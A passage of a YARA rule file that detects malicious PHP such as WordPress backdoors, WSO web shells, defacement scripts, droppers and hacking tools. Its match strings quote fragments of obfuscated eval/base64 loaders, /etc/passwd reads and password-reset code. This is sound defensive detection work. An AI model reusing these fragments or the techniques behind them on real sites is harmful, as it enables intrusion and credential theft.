        $trigger and PR02574 and PR03800 and PR03801
}

private rule PR03802 : trigger
{
    strings:
        $ps0 = "if (isset($_POST[\"MY_AUTH\"]) && $_POST[\"MY_AUTH\"] === \""
    condition:
        $ps0
}

rule php_backdoor_wpuser_010 : backdoor
{
    strings:
        $trigger = "<form"
    condition:
        $trigger and PR03802
}

rule php_backdoor_wpuser_011 : backdoor
{
    strings:
        $trigger = ");return '';}add_action(base64_decode("
    condition:
        $trigger
}

private rule PR03803 : trigger
{
    strings:
        $ps0 = "SET user_pass="
    condition:
        $ps0
}

rule php_backdoor_wpuser_012 : backdoor
{
    strings:
        $trigger = ".md5("
    condition:
        $trigger and PR01837 and PR02839 and PR03803
}

private rule PR03804 : trigger
{
    strings:
        $ps0 = "wp_safe_redirect("
    condition:
        $ps0
}

private rule PR03805 : trigger
{
    strings:
        $ps0 = "pass"
    condition:
        $ps0
}

rule php_backdoor_wpuser_013 : backdoor
{
    strings:
        $trigger = "$user_info->user_login;"
    condition:
        $trigger and PR03804 and PR02574 and PR01788 and PR03805
}

private rule PR03806 : trigger
{
    strings:
        $ps0 = "include_once"
    condition:
        $ps0
}

private rule PR03807 : trigger
{
    strings:
        $ps0 = "admin', $user->ID"
    condition:
        $ps0
}

private rule PR03808 : trigger
{
    strings:
        $ps0 = "->user_login"
    condition:
        $ps0
}

rule php_backdoor_wpuser_014 : backdoor
{
    strings:
        $trigger = "wp_set_password"
    condition:
        $trigger and PR03707 and PR03806 and PR03807 and PR03808
}

private rule PR03809 : trigger
{
    strings:
        $ps0 = "bin2hex($"
    condition:
        $ps0
}

private rule PR03810 : trigger
{
    strings:
        $ps0 = "implode(\"\\n\", array_unique($"
    condition:
        $ps0
}

rule php_backdoor_wpuser_015 : backdoor
{
    strings:
        $trigger = "FILE_IGNORE_NEW_LINES"
    condition:
        $trigger and PR00435 and PR03809 and PR03810
}

private rule PR03811 : trigger
{
    strings:
        $ps0 = "isset($_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_wpuser_015_02 : backdoor
{
    strings:
        $trigger = "FILE_IGNORE_NEW_LINES"
    condition:
        $trigger and PR00435 and PR03811 and PR03809
}

rule php_backdoor_WSO_001 : backdoor
{
    strings:
        $trigger = "WSO 2.1.5 Edition r3coded by Kerupuk"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR03812 : trigger
{
    strings:
        $ps0 = "$x0r = \""
    condition:
        $ps0
}

rule php_backdoor_WSO_002 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode($x0r)));"
    condition:
        $trigger and PR03812
}

rule php_backdoor_WSO_003 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"JJ3HkqNaFkX"
    condition:
        $trigger
}

rule php_backdoor_WSO_004 : backdoor
{
    strings:
        $trigger = "('eJzlvWt3GsfSKPzZe639H0YTkoE"
    condition:
        $trigger and PR00029
}

rule php_backdoor_WSO_005 : backdoor
{
    strings:
        $trigger = "@preg_replace(\"/([a-z0-9-%]+).([a-z-@]+).([a-z]+)/\\x65\", \"$2($3(urldecode('$1')))"
    condition:
        $trigger
}

private rule PR03813 : trigger
{
    strings:
        $ps0 = "preg_replace(\"/(.*)/\\x65"
    condition:
        $ps0
}

private rule PR03814 : trigger
{
    strings:
        $ps0 = "'%'.substr($"
    condition:
        $ps0
}

rule php_backdoor_WSO_006 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR03813 and PR03814
}

// MANUAL FIX NECESSARY
private rule PR03815 : trigger
{
    strings:
        $ps0 = "abcdefghijklmnopqrstuvwxyz(*_;/.)"
    condition:
        $ps0
}

private rule PR03816 : trigger
{
    strings:
        $ps0 = "FilesMan"
    condition:
        $ps0
}

rule php_backdoor_WSO_008 : backdoor
{
    strings:
        $trigger = "WSO"
    condition:
        $trigger and PR00029 and PR03816
}

private rule PR03817 : trigger
{
    strings:
        $ps0 = "JGkzNmE1YjQwZDFjMDQ1YjMwNmJhZTk5NmUzNTU3NTUyND0iZ1x4N2FceDc1XH"
    condition:
        $ps0
}

rule php_backdoor_WSO_008_02 : backdoor
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR03817
}

private rule PR03818 : trigger
{
    strings:
        $ps0 = "preg_replace(\"/./\\x65\",\"\\x65\\x76\\x61\\x6c(gzinflate(urldecode("
    condition:
        $ps0
}

rule php_backdoor_WSO_009 : backdoor
{
    strings:
        $trigger = ")));\",\".\");"
    condition:
        $trigger and PR03818
}

rule php_backdoor_WSO_010 : backdoor
{
    strings:
        $trigger = "7X39d9q6sujPuWvd/0H14W7DLiFA0r3bEJLmO7RpkoZ89CN9OcYYcDGYbZuQtCf/+5sZfVg2htB2n3PXW+vts06DpdFoNJ"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR03819 : trigger
{
    strings:
        $ps0 = "str_split(md5($pass).md5($pass));"
    condition:
        $ps0
}

rule php_backdoor_WSO_011 : backdoor
{
    strings:
        $trigger = "eval(trim(base64_decode(base64_decode($"
    condition:
        $trigger and PR03819
}

private rule PR03820 : trigger
{
    strings:
        $ps0 = "WSO SHELL"
    condition:
        $ps0
}

rule php_backdoor_WSO_012 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR03820
}

// MANUAL FIX NECESSARY
rule php_backdoor_WSO_013 : backdoor
{
    strings:
        $trigger = ".\"\\x"
        $php_backdoor_WSO_013_r0 = /\$[\w]+\(\$[\w]+\(\"[^\"]{4000}[^;]+;[\s]*echo[\s]*\"\{\$\{[\s]*eval[\s]*\(\$[\w]+\)[\s]*\}\}\";/
    condition:
        $trigger and PR01396 and $php_backdoor_WSO_013_r0
}

private rule PR03821 : trigger
{
    strings:
        $ps0 = "QGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7DQpAaW5"
    condition:
        $ps0
}

rule php_backdoor_WSO_014 : backdoor
{
    strings:
        $trigger = "if (preg_match($"
    condition:
        $trigger and PR01350 and PR03821
}

rule php_backdoor_WSO_015 : backdoor
{
    strings:
        $trigger = "SKeJRoo7pZFlVRVltgMoNprFoZX6WBbEyOXsWD"
    condition:
        $trigger and PR01398
}

rule php_backdoor_WSO_016 : backdoor
{
    strings:
        $trigger = "VP8dVTyzXPRtnKAso2WdMJA0K2yhK3EurT9ho215XPOaMKEspT9mqS90"
    condition:
        $trigger and PR01854 and PR00029
}

private rule PR03822 : trigger
{
    strings:
        $ps0 = "owO0lGelpwOp01JhdyWUN1TQ9FJg4CIn42bpR3YhdCKj5Wd"
    condition:
        $ps0
}

rule php_backdoor_WSO_017 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR03822
}

rule php_backdoor_WSO_018 : backdoor
{
    strings:
        $trigger = "@$_=create_function(\"\",@gzuncompress($__));$_();"
    condition:
        $trigger
}

rule php_backdoor_WSO_019 : backdoor
{
    strings:
        $trigger = "$debuger .= pack (\"C\",hexdec (substr ($string,$one,2)));"
    condition:
        $trigger and PR02700
}

rule php_backdoor_WSO_020 : backdoor
{
    strings:
        $trigger = "WVkdlRlV5U1RCa01sa3dUMGhaZGs5RVJUTk1lWE0xV1ZScmRrd3piM1pMTUZKNVRsaEJia3RUYTNCUGR6MDknKSkpOw=="
    condition:
        $trigger and PR00029 and PR00634
}

private rule PR03823 : trigger
{
    strings:
        $ps0 = "Y2xOR1FqVmpibXMxV201YU1tVnFZM1pPUjNoM1kyMUZNRkJUWTNCTFUyczMnK"
    condition:
        $ps0
}

rule php_backdoor_WSO_021 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR03823
}

private rule PR03824 : trigger
{
    strings:
        $ps0 = "='';foreach("
    condition:
        $ps0
}

private rule PR03825 : trigger
{
    strings:
        $ps0 = "){$x.=$y[$"
    condition:
        $ps0
}

private rule PR03826 : trigger
{
    strings:
        $ps0 = "=strlen($y);$"
    condition:
        $ps0
}

private rule PR03827 : trigger
{
    strings:
        $ps0 = ");$x='';for($"
    condition:
        $ps0
}

rule php_backdoor_WSO_022 : backdoor
{
    strings:
        $trigger = "];}return $x;}$"
    condition:
        $trigger and PR03824 and PR03825 and PR03826 and PR03827
}

private rule PR03828 : trigger
{
    strings:
        $ps0 = "7f3ZkuNIkiiIPkd8BSs6uunRERkOcHF3RmREFzdwJ50bSKKyxgcEQBIkNifA"
    condition:
        $ps0
}

rule php_backdoor_WSO_023 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03828
}

private rule PR03829 : trigger
{
    strings:
        $ps0 = "7f3ZkuNKkigIPkd8BTMqquhR"
    condition:
        $ps0
}

rule php_backdoor_WSO_024 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03829
}

// MANUAL FIX NECESSARY
rule php_backdoor_WSO_025 : backdoor
{
    strings:
        $trigger = "preg_replace(\"/["
        $php_backdoor_WSO_025_r0 = /<\?php[\s]*function [\w]+\(\$[\w]+\)[\s]*\{[^\}]+\}[\s]*\^[\s]*\$[\w]+\{\$[\w]+\};[^\}]+[\}\s]+return \$[\w]+;[\s]*\}[\s]*\$[\w]+[\s]*=[\s]*preg_replace\(\"\/\[/
    condition:
        $trigger and PR01590 and $php_backdoor_WSO_025_r0
}

rule php_backdoor_WSO_027 : backdoor
{
    strings:
        $trigger = "7b1pk+JKtiD4OfNXUPnyPSI7l5"
    condition:
        $trigger and PR00029 and PR01436
}

rule php_backdoor_WSO_028 : backdoor
{
    strings:
        $trigger = "function Suicide($m"
    condition:
        $trigger and PR00042 and PR00046
}

// MANUAL FIX NECESSARY
rule php_backdoor_WSO_030 : backdoor
{
    strings:
        $trigger = "\\x7"
        $php_backdoor_WSO_030_r0 = /\$[\w]+=['\"][^'\"]{5000}[^'\"]+['\"];[\s]*(\$[\w]+\.?=\"[^\"]+\";[\s]*){10,}/
    condition:
        $trigger and $php_backdoor_WSO_030_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_WSO_031 : backdoor
{
    strings:
        $trigger = ".\"\\x"
        $php_backdoor_WSO_031_r0 = /=(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"r\"|\".x72\"|chr\(114\))\.(\"t\"|\".x74\"|chr\(116\));/
        $php_backdoor_WSO_031_r1 = /=(\"b\"|\".x62\"|chr\(98\))\.(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"6\"|\".x36\"|chr\(54\))\.(\"4\"|\".x34\"|chr\(52\))\.(\"_\"|\".x5f\"|chr\(95\))\.(\"d\"|\".x64\"|chr\(100\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"c\"|\".x63\"|chr\(99\))\.(\"o\"|\".x6f\"|chr\(111\))\.(\"d\"|\".x64\"|chr\(100\))\.(\"e\"|\".x65\"|chr\(101\));/
        $php_backdoor_WSO_031_r2 = /(\$+[\w]+=(([']['])|(\.?\".x[a-f0-9]{2}\"\.?)|(\.?chr\([\d]+\)\.?)|(\.?\"[\w#]\"\.?))+;[\s]*){2,}[^\(]+(@?\$[\w]+\(\s)+[^;]+\)\);/
    condition:
        $trigger and PR01396 and $php_backdoor_WSO_031_r0 and $php_backdoor_WSO_031_r1 and $php_backdoor_WSO_031_r2
}

// MANUAL FIX NECESSARY
rule php_backdoor_WSO_032 : backdoor
{
    strings:
        $trigger = ".\"\\x"
        $php_backdoor_WSO_032_r0 = /=(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"r\"|\".x72\"|chr\(114\))\.(\"t\"|\".x74\"|chr\(116\));/
        $php_backdoor_WSO_032_r1 = /=(\"b\"|\".x62\"|chr\(98\))\.(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"6\"|\".x36\"|chr\(54\))\.(\"4\"|\".x34\"|chr\(52\))\.(\"_\"|\".x5f\"|chr\(95\))\.(\"d\"|\".x64\"|chr\(100\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"c\"|\".x63\"|chr\(99\))\.(\"o\"|\".x6f\"|chr\(111\))\.(\"d\"|\".x64\"|chr\(100\))\.(\"e\"|\".x65\"|chr\(101\));/
        $php_backdoor_WSO_032_r2 = /(\$+[\w]+=(([']['])|(\.?\".x[a-f0-9]{2}\"\.?)|(\.?chr\([\d]+\)\.?)|(\.?\"[\w#]\"\.?))+;[\s]*)+[^#]+\)\);\s*[# ]+/
    condition:
        $trigger and PR01396 and $php_backdoor_WSO_032_r0 and $php_backdoor_WSO_032_r1 and $php_backdoor_WSO_032_r2
}

private rule PR03830 : trigger
{
    strings:
        $ps0 = "lWo48J4DNVBIqVVP1uE"
    condition:
        $ps0
}

rule php_backdoor_WSO_033 : backdoor
{
    strings:
        $trigger = "eval/*"
    condition:
        $trigger and PR03830
}

rule php_backdoor_X0MB13shell_001 : backdoor
{
    strings:
        $trigger = "X0MB13"
    condition:
        $trigger and PR00029 and PR00507
}

private rule PR03831 : trigger
{
    strings:
        $ps0 = "} elseif (($perms & 0x8000) == 0x8000) {"
    condition:
        $ps0
}

rule php_backdoor_xhell_001 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
    condition:
        $trigger and PR02387 and PR03831
}

rule php_backdoor_zacoshell_001 : backdoor
{
    strings:
        $trigger = "<title>Small Web Shell by ZaCo"
    condition:
        $trigger and PR00029 and PR00265
}

rule php_backdoor_zip_uploader_001 : backdoor
{
    strings:
        $trigger = "$parts = explode('|', $var_b($_POST['data']));"
    condition:
        $trigger
}

private rule PR03832 : trigger
{
    strings:
        $ps0 = "<title>Upload Zip file"
    condition:
        $ps0
}

rule php_backdoor_zip_uploader_002 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR03832 and PR01021
}

private rule PR03833 : trigger
{
    strings:
        $ps0 = "function unzip"
    condition:
        $ps0
}

private rule PR03834 : trigger
{
    strings:
        $ps0 = "echo \"Ok! $"
    condition:
        $ps0
}

rule php_backdoor_zip_uploader_003 : backdoor
{
    strings:
        $trigger = "function lsdir()"
    condition:
        $trigger and PR00039 and PR03833 and PR03834
}

private rule PR03835 : trigger
{
    strings:
        $ps0 = "new ZipArchive();"
    condition:
        $ps0
}

private rule PR03836 : trigger
{
    strings:
        $ps0 = "unzip -o"
    condition:
        $ps0
}

rule php_backdoor_zip_uploader_004 : backdoor
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR01780 and PR03835 and PR03836
}

private rule PR03837 : trigger
{
    strings:
        $ps0 = "if (is_file($fi"
    condition:
        $ps0
}

rule php_backdoor_zip_uploader_005 : backdoor
{
    strings:
        $trigger = "f ($zip->open($file) === TRUE)"
    condition:
        $trigger and PR02020 and PR03837
}

rule php_backdoor_zip_uploader_006 : backdoor
{
    strings:
        $trigger = "$zip->open($_COOKIE["
    condition:
        $trigger and PR02141
}

private rule PR03838 : trigger
{
    strings:
        $ps0 = "BOZKURT TIM"
    condition:
        $ps0
}

rule php_defaced_bozkurttim_001 : defaced
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR03838
}

private rule PR03839 : trigger
{
    strings:
        $ps0 = "exit; ?>"
    condition:
        $ps0
}

rule php_defaced_encrypted_001 : defaced
{
    strings:
        $trigger = "<? echo(stripslashes(base64_decode('"
    condition:
        $trigger and PR03839
}

rule php_defaced_encrypted_002 : defaced
{
    strings:
        $trigger = ")){define(\"\\x43\\x59\\x42\\x45\\x52\\x31\\x37\\x33"
    condition:
        $trigger and PR00029 and PR01422
}

// MANUAL FIX NECESSARY
private rule PR03840 : trigger
{
    strings:
        $ps0 = ").getcwd"
    condition:
        $ps0
}

private rule PR03841 : trigger
{
    strings:
        $ps0 = "($_POST[base64_decode("
    condition:
        $ps0
}

rule php_defaced_encrypted_003 : defaced
{
    strings:
        $trigger = "base64_decode(chr("
        $php_defaced_encrypted_003_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR03840 and PR03841 and $php_defaced_encrypted_003_r0
}

private rule PR03842 : trigger
{
    strings:
        $ps0 = "king By : RxR HaCkEr"
    condition:
        $ps0
}

rule php_defaced_gen_005 : defaced
{
    strings:
        $trigger = "hell"
    condition:
        $trigger and PR03842
}

rule php_defaced_generic_001 : defaced
{
    strings:
        $trigger = "OR(isset($_GET[\"z\"])))"
    condition:
        $trigger
}

rule php_defaced_generic_002 : defaced
{
    strings:
        $trigger = "<title>Pwn3d  by"
    condition:
        $trigger
}

rule php_defaced_generic_004 : defaced
{
    strings:
        $trigger = "<title>Lamer-ID"
    condition:
        $trigger
}

private rule PR03843 : trigger
{
    strings:
        $ps0 = "PAKISTAN CYBER ATTACKER"
    condition:
        $ps0
}

rule php_defaced_generic_005 : defaced
{
    strings:
        $trigger = "reet"
    condition:
        $trigger and PR03843
}

rule php_defaced_generic_011 : defaced
{
    strings:
        $trigger = "ST4RHUN7ER"
    condition:
        $trigger and PR01642
}

private rule PR03844 : trigger
{
    strings:
        $ps0 = "1IGp1c3QgZ290IGhhY2t"
    condition:
        $ps0
}

rule php_defaced_generic_012 : defaced
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR03844
}

rule php_defaced_generic_013 : defaced
{
    strings:
        $trigger = "<title>By MiLwrOM"
    condition:
        $trigger
}

rule php_defaced_generic_014 : defaced
{
    strings:
        $trigger = "rSpyUp!!</title>"
    condition:
        $trigger and PR00042
}

rule php_defaced_generic_015 : defaced
{
    strings:
        $trigger = "Uploader By ATTARI"
    condition:
        $trigger and PR00042
}

private rule PR03845 : trigger
{
    strings:
        $ps0 = "content='AnonClay Cyber Team"
    condition:
        $ps0
}

rule php_defaced_generic_016 : defaced
{
    strings:
        $trigger = "top.location"
    condition:
        $trigger and PR03845 and PR00050
}

rule php_defaced_generic_017 : defaced
{
    strings:
        $trigger = "<title>Porn sites list</title>"
    condition:
        $trigger
}

rule php_defaced_generic_018 : defaced
{
    strings:
        $trigger = "<title>Owned</title>"
    condition:
        $trigger
}

rule php_defaced_generic_019 : defaced
{
    strings:
        $trigger = "\\x48\\141\\x63\\x6b\\x65\\144\\40\\x42\\x79\\x20"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_defaced_generic_020 : defaced
{
    strings:
        $trigger = "PHRpdGxlPjw8IEhhY2tlZCBC"
        $php_defaced_generic_020_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and PR00029 and $php_defaced_generic_020_r0
}

private rule PR03846 : trigger
{
    strings:
        $ps0 = "OR(isset($_GET[\"z\"])))"
    condition:
        $ps0
}

rule php_defaced_hacked_by_you_001 : defaced
{
    strings:
        $trigger = "$i=strrev(\"uoy yb dekcah\");"
    condition:
        $trigger and PR03846
}

rule php_defaced_script_002 : defaced
{
    strings:
        $trigger = "Mass Deface"
    condition:
        $trigger
}

rule php_defaced_script_003 : defaced
{
    strings:
        $trigger = ";echo Hacked by"
    condition:
        $trigger
}

rule php_defaced_script_004 : defaced
{
    strings:
        $trigger = "AUTOMATIC JOOMLA DEFACER"
    condition:
        $trigger and PR00222
}

rule php_defaced_script_005 : defaced
{
    strings:
        $trigger = "$text=file_get_contents($base_url.'/sym/root/var/named/');"
    condition:
        $trigger and PR00222
}

rule php_defaced_script_006 : defaced
{
    strings:
        $trigger = "fwrite($x,\"Hacked By J4r\");"
    condition:
        $trigger
}

rule php_defaced_script_008 : defaced
{
    strings:
        $trigger = "massdefacedir"
    condition:
        $trigger and PR00222
}

rule php_defaced_script_008_002 : defaced
{
    strings:
        $trigger = "name='execmassdeface"
    condition:
        $trigger and PR00222
}

rule php_defaced_script_009 : defaced
{
    strings:
        $trigger = "defaceIT v"
    condition:
        $trigger and PR01648
}

rule php_defaced_script_010 : defaced
{
    strings:
        $trigger = "Wordpress MassDeface-->"
    condition:
        $trigger
}

rule php_defaced_script_010_02 : defaced
{
    strings:
        $trigger = ">Tum Symlink Listesi"
    condition:
        $trigger and PR00222
}

rule php_defaced_script_011 : defaced
{
    strings:
        $trigger = "$data_to_post['poc'] = 'SQL Injection"
    condition:
        $trigger and PR00222
}

rule php_defaced_script_012 : defaced
{
    strings:
        $trigger = "Hacked By bajatax"
    condition:
        $trigger
}

private rule PR03847 : trigger
{
    strings:
        $ps0 = "curl_init (\"http://www.zone-h.org/"
    condition:
        $ps0
}

rule php_defaced_script_013 : defaced
{
    strings:
        $trigger = "hack"
    condition:
        $trigger and PR03847
}

private rule PR03848 : trigger
{
    strings:
        $ps0 = "htm',\"w+\"),@base64_decode($oIndex));"
    condition:
        $ps0
}

rule php_defaced_script_014 : defaced
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03848
}

rule php_defaced_script_015 : defaced
{
    strings:
        $trigger = "Mr.Rm19"
    condition:
        $trigger and PR01350 and PR02379
}

rule php_defaced_T1KUS90T_001 : defaced
{
    strings:
        $trigger = "<title>T1KUS90T"
    condition:
        $trigger
}

private rule PR03849 : trigger
{
    strings:
        $ps0 = "y Zetas Oujdi"
    condition:
        $ps0
}

rule php_defaced_zetas_oujdi_001 : defaced
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR03849
}

private rule PR03850 : trigger
{
    strings:
        $ps0 = "60,63,112,104,112,13,10,105,110,105,95,115,101,116,40,39,117,112,108,111,97,100,95,109,97,120,95"
    condition:
        $ps0
}

rule php_dropper_backdoor_001 : dropper
{
    strings:
        $trigger = "chr"
    condition:
        $trigger and PR03850
}

rule php_dropper_generic_002 : dropper
{
    strings:
        $trigger = "$bad_template = '<h1 style=\"color:black\">Please read the pdf document.</h1>';"
    condition:
        $trigger
}

rule php_dropper_generic_004 : dropper
{
    strings:
        $trigger = "eval(base64_decode(ZWNobyBjb"
    condition:
        $trigger
}

rule php_dropper_linuxrootkit_001 : dropper
{
    strings:
        $trigger = "$so32 = \"\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00"
    condition:
        $trigger
}

private rule PR03851 : trigger
{
    strings:
        $ps0 = "if (getenv(\"MAYHEM_DEBUG\"))"
    condition:
        $ps0
}

rule php_dropper_mayhem_001 : dropper
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR03851
}

private rule PR03852 : trigger
{
    strings:
        $ps0 = "file_put_contents($id,"
    condition:
        $ps0
}

private rule PR03853 : trigger
{
    strings:
        $ps0 = "if (!defined('PCLZIP_READ_BLOCK_SIZE'))"
    condition:
        $ps0
}

rule php_dropper_pclzip_001 : dropper
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03852 and PR03853
}

rule php_dropper_reverse_shell_001 : dropper
{
    strings:
        $trigger = "printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");"
    condition:
        $trigger and PR00013
}

rule php_exploit_cpanelbruteforce_001_001 : exploit
{
    strings:
        $trigger = "<title>cPanel brute forcer"
    condition:
        $trigger
}

rule php_exploit_cpanelbruteforce_001_002 : exploit
{
    strings:
        $trigger = "@$passwd=fopen('/etc/passwd',"
    condition:
        $trigger
}

private rule PR03854 : trigger
{
    strings:
        $ps0 = "installer"
    condition:
        $ps0
}

rule php_exploit_duplicator_001 : exploit
{
    strings:
        $trigger = "$GLOBALS['FW_DUPLICATOR_VERSION"
    condition:
        $trigger and PR03854 and PR01353
}

rule php_exploit_joomla_reg_001 : exploit
{
    strings:
        $trigger = "<title>Checking joomla 1.6 - 1.7 Registration Exploit</title>"
    condition:
        $trigger
}

rule php_exploit_leak_001_002 : exploit
{
    strings:
        $trigger = "posix_getpwuid(@fileowner(\"/etc/valiases/\""
    condition:
        $trigger
}

private rule PR03855 : trigger
{
    strings:
        $ps0 = "posix_getpwuid("
    condition:
        $ps0
}

private rule PR03856 : trigger
{
    strings:
        $ps0 = "scandir(\"/var/named"
    condition:
        $ps0
}

rule php_exploit_leak_001_003 : exploit
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR03855 and PR03856
}

rule php_exploit_suphp_001 : exploit
{
    strings:
        $trigger = "system(\"pwd;ls -lia;uname -a;cat /etc/passwd\")"
    condition:
        $trigger
}

rule php_exploit_sysinfo_002 : exploit
{
    strings:
        $trigger = "}}echo 'rahui#',$maxlen,'#rahui';"
    condition:
        $trigger
}

rule php_exploit_sysinfo_003 : exploit
{
    strings:
        $trigger = "$message2=shell_exec(\"sh inst\");"
    condition:
        $trigger
}

private rule PR03857 : trigger
{
    strings:
        $ps0 = "@fwrite($fp, \"installatron\") !== 12 || @fwrite($fp, \"installatron"
    condition:
        $ps0
}

rule php_exploit_sysinfo_005 : exploit
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR03857
}

private rule PR03858 : trigger
{
    strings:
        $ps0 = "copy"
    condition:
        $ps0
}

private rule PR03859 : trigger
{
    strings:
        $ps0 = "* @subpackage  Template.system"
    condition:
        $ps0
}

rule php_exploit_sysinfo_006 : exploit
{
    strings:
        $trigger = "$p = getcwd();"
    condition:
        $trigger and PR03858 and PR03859
}

rule php_exploit_sysinfo_007 : exploit
{
    strings:
        $trigger = "$_POST['cmd'])); } else echo \"echo file_get_contents('/etc/passwd"
    condition:
        $trigger
}

rule php_exploit_sysinfo_008 : exploit
{
    strings:
        $trigger = "/etc/passwd Bypasser"
    condition:
        $trigger and PR03855
}

private rule PR03860 : trigger
{
    strings:
        $ps0 = "$etc_passwd = @is_readable(\"/etc/passwd\") ? \"<b><span style=\\\"color:white\\\">ON"
    condition:
        $ps0
}

rule php_exploit_sysinfo_010 : exploit
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR03860
}

private rule PR03861 : trigger
{
    strings:
        $ps0 = "logbox"
    condition:
        $ps0
}

rule php_hacktool_admin_page_finder_001 : hacktool
{
    strings:
        $trigger = "xploit_404string"
    condition:
        $trigger and PR03861 and PR00050 and PR00323
}

rule php_hacktool_admin_page_finder_002 : hacktool
{
    strings:
        $trigger = "<title>Admin Finder"
    condition:
        $trigger
}

private rule PR03862 : trigger
{
    strings:
        $ps0 = ">Admin Page Finder<"
    condition:
        $ps0
}

rule php_hacktool_admin_page_finder_003 : hacktool
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR01726 and PR00046 and PR03862
}

private rule PR03863 : trigger
{
    strings:
        $ps0 = "query(\"SELECT\"."
    condition:
        $ps0
}

private rule PR03864 : trigger
{
    strings:
        $ps0 = "adminer()"
    condition:
        $ps0
}

rule php_hacktool_adminer_001 : hacktool
{
    strings:
        $trigger = "error_reporting(6135);"
    condition:
        $trigger and PR00039 and PR03863 and PR03864
}

rule php_hacktool_amazon_email_validator_001 : hacktool
{
    strings:
        $trigger = "<title>AMAZON Email CheCker"
    condition:
        $trigger
}

private rule PR03865 : trigger
{
    strings:
        $ps0 = "[Arhack-team]"
    condition:
        $ps0
}

rule php_hacktool_Arhack_generic_001 : hacktool
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR03865
}

rule php_hacktool_auth_pass_001 : hacktool
{
    strings:
        $trigger = "\";//"
    condition:
        $trigger and PR01421
}

private rule PR03866 : trigger
{
    strings:
        $ps0 = "*/ ?>"
    condition:
        $ps0
}

private rule PR03867 : trigger
{
    strings:
        $ps0 = "; unlink(__FILE__); /*"
    condition:
        $ps0
}

rule php_hacktool_autodestroy_001 : hacktool
{
    strings:
        $trigger = "<?php echo \""
    condition:
        $trigger and PR03866 and PR03867
}

private rule PR03868 : trigger
{
    strings:
        $ps0 = "rmdir($dir.$file) or DIE(\"couldn't delete $dir$file<br />\");"
    condition:
        $ps0
}

rule php_hacktool_autodestroy_002 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03868 and PR00507
}

private rule PR03869 : trigger
{
    strings:
        $ps0 = "}elseif($_GET['page'] == 'get-webcam'){"
    condition:
        $ps0
}

rule php_hacktool_backend_001 : hacktool
{
    strings:
        $trigger = "}elseif($_GET['page'] == 'keystrokes'){"
    condition:
        $trigger and PR03869 and PR02208
}

rule php_hacktool_backend_001_02 : hacktool
{
    strings:
        $trigger = "$clear_text = openssl_decrypt($encrypt_text, \"DES-EDE3\", $key, OPENSSL_RAW_DATA, \"\");"
    condition:
        $trigger
}

private rule PR03870 : trigger
{
    strings:
        $ps0 = "preg_match_all('#<h2 class=\"sb_h3 cttl\"><a href=\"(https?"
    condition:
        $ps0
}

rule php_hacktool_bing_dork_001 : hacktool
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR03870
}

rule php_hacktool_bing_scanner_001 : hacktool
{
    strings:
        $trigger = "$sites = array_map(\"site\", bing(\"ip:"
    condition:
        $trigger and PR01401
}

private rule PR03871 : trigger
{
    strings:
        $ps0 = "Black Sniper"
    condition:
        $ps0
}

rule php_hacktool_black_sniper_exec_001 : hacktool
{
    strings:
        $trigger = "$exec=exec(\""
    condition:
        $trigger and PR03871
}

rule php_hacktool_black_sniper_md5_001 : hacktool
{
    strings:
        $trigger = "$crypt_now=$_GET["
    condition:
        $trigger and PR03871
}

private rule PR03872 : trigger
{
    strings:
        $ps0 = "curl_init(\"http://zone-h.org/notify/single"
    condition:
        $ps0
}

rule php_hacktool_black_sniper_zone_h_001 : hacktool
{
    strings:
        $trigger = "Black Sniper"
    condition:
        $trigger and PR03872
}

private rule PR03873 : trigger
{
    strings:
        $ps0 = "aHR0cDovL3d3dy5yZWZ1ZC5tZ"
    condition:
        $ps0
}

rule php_hacktool_botnet_CC_001 : hacktool
{
    strings:
        $trigger = "md5($_POST["
    condition:
